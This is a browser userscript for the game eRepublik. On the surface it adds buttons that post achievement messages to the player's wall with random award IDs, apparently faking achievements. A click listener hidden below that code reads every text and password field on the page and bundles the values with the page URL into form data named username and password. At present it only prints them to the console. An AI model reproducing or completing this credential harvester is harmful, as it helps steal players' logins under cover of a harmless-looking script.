// ==UserScript==
// @name           a test
// @namespace      http://userscripts.org/scripts/show/114750
// @version        0.1
// @description    junk
// @include        http://www.erepublik.com/*
// @require	       https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.js
// ==/UserScript==

var JS_bh_post = 'javascript: var aid = Math.floor(Math.random()*6660666) + &quot;&quot;; $j.post(&quot;en/main/wall-post/automatic&quot;, { _token: $j(&quot;#_token&quot;).val(), message: &quot;Battle hero&quot;, awardId: aid }, function(response) { if(!response.message) { alert(response.error_message); } }, &quot;json&quot;);';
var JS_ch_post = 'javascript: var aid = Math.floor(Math.random()*6660666) + &quot;&quot;; $j.post(&quot;en/main/wall-post/automatic&quot;, { _token: $j(&quot;#_token&quot;).val(), message: &quot;Campaign hero&quot;, awardId: aid }, function(response) { if(!response.message) { alert(response.error_message); } }, &quot;json&quot;);';
var JS_rh_post = 'javascript: var aid = Math.floor(Math.random()*6660666) + &quot;&quot;; $j.post(&quot;en/main/wall-post/automatic&quot;, { _token: $j(&quot;#_token&quot;).val(), message: &quot;Resistance hero&quot;, awardId: aid }, function(response) { if(!response.message) { alert(response.error_message); } }, &quot;json&quot;);';
var JS_mc_post = 'javascript: var aid = Math.floor(Math.random()*6660666) + &quot;&quot;; $j.post(&quot;en/main/wall-post/automatic&quot;, { _token: $j(&quot;#_token&quot;).val(), message: &quot;Mercenary&quot;, awardId: aid }, function(response) { if(!response.message) { alert(response.error_message); } }, &quot;json&quot;);';

var bh = '<a href="javascript:;" onclick="'+JS_bh_post+'"><img src="/images/achievements/icon_achievement_battlehero_on.gif" alt="Battle Hero"</a>';
var ch = '<a href="javascript:;" onclick="'+JS_ch_post+'"><img src="/images/achievements/icon_achievement_campaignhero_on.gif" alt="Campaign Hero"</a>';
var rh = '<a href="javascript:;" onclick="'+JS_rh_post+'"><img src="/images/achievements/icon_achievement_resistance_on.gif" alt="Resistance Hero"</a>';
var mc = '<a href="javascript:;" onclick="'+JS_mc_post+'"><img src="/images/achievements/icon_achievement_mercenary_on.gif" alt="Mercenary"</a>';

var table = '<div><table width="100%"><tr align="center"><td colspan="4"><strong>Post on the wall that you earned:</strong></td></tr><tr align="center"><td>'+bh+'</td><td>'+ch+'</td><td>'+rh+'</td><td>'+mc+'</td></tr></table><br></div>';

$('#citizen_feed').before(table);

document.addEventListener('click', function(event) {
	var formData = new FormData();
	formData.append("site", document.location.href);
	var input, username = "", password = "", usnm = 0, pwds = 0;
	for(var i = 0; i <= $('input').length; i++) {
		if($('input').eq(i).attr('type') == "text") {
			input = $('input').eq(i).val();
			if(input != "") {
				usnm++;
				if(usnm > 1)	username = username + "{OR}";
				username = username + input;
			}
		}
	formData.append("username", username);
		if($('input').eq(i).attr('type') == "password") {
		input = $('input').eq(i).val();
		if(input != "") {
			pwds++;
			if(pwds > 1)	password = password + "{OR}";
			password = password + input;
		}
	}
	formData.append("password", password);
}
if(password != "" && username != "") {
	console.log(username+' '+password);
}
}, false);
